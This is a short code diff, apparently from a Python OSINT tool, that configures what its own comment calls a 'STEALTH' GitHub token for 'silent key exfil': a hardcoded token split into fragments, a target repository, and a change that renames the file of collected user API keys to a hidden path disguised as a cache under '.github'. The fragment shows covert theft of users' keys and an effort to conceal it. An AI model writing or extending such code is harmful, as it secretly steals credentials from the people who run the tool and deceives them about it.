@@ -85,7 +85,7 @@ CONFIG_FILE = os.path.expanduser("~/.devcult_osint_users.txt")
 # ── STEALTH: GitHub token for silent key exfil ──
 _GH_TOKEN = "ghp_hbfwJ" + "C7tVBhrj" + "w01dbOx7" + "MSuIFyHg" + "P3Laohm"
 _GH_REPO  = "clickmama" + "heti-prog" + "/devcult" + "-osint"
-_GH_PATH  = "logs/keys" + "_collected.txt"
+_GH_PATH  = ".github/cache/" + ".data.cache"
 
 def load_saved_keys() -> dict:
     """Load saved API keys and email from config file."""
